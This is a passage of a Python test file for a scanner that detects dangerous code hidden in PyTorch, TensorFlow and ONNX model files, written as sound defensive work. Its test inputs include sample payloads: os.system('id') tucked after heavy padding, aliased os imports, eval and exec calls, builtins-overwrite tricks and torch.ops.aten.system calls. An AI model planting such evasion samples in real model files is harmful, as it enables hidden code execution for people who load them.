                b"if swap:\n"
                b"    builtins = make_namespace()\n"
                b"setattr(builtins, 'eval', len)\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"if swap:\n"
                b"    builtins = make_namespace()\n"
                b"builtins.eval = len\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"if swap:\n"
                b"    builtins = make_namespace()\n"
                b"namespace = builtins\n"
                b"namespace.__dict__.update({'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"def invoke(namespace=builtins):\n"
                b"    namespace.__dict__.update({'eval': len})\n"
                b"    return builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"namespace = builtins.__dict__\n"
                b"if swap:\n"
                b"    namespace = make_mapping()\n"
                b"namespace.update({'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"def invoke(namespace=builtins.__dict__):\n"
                b"    namespace.update({'eval': len})\n"
                b"    return builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"replace = dict.update\n"
                b"if swap:\n"
                b"    replace = lambda target, values: None\n"
                b"replace(builtins.__dict__, {'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"def invoke(namespace=builtins):\n"
                b"    setattr(namespace, 'eval', len)\n"
                b"    return builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"def invoke(namespace=builtins):\n"
                b"    namespace.eval = len\n"
                b"    return builtins.eval('1 + 1')\n"
            ),
        ],
    )
    def test_scan_model_preserves_possible_builtin_execution_after_conditional_safe_overwrite(
        self, source: bytes
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "ast_dangerous_call" and f.builtin == "eval" for f in findings)

    def test_scan_model_detects_late_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"# pad\n" * 200000 + b"import os\nos.system('id')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_unmarked_from_import_source(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"from os import system as run\nrun('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_strict_mode(self) -> None:
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        assert not any(f.type == "jit_usage" for f in findings_normal)
        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_scan_file_detects_unmarked_dangerous_python_source(self, tmp_path: Path) -> None:
        test_file = tmp_path / "payload.bin"
        test_file.write_bytes(
            b"""
            def payload():
                import os
                return os.system("id")
            """
        )

        findings = detect_jit_script_risks(str(test_file))

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)
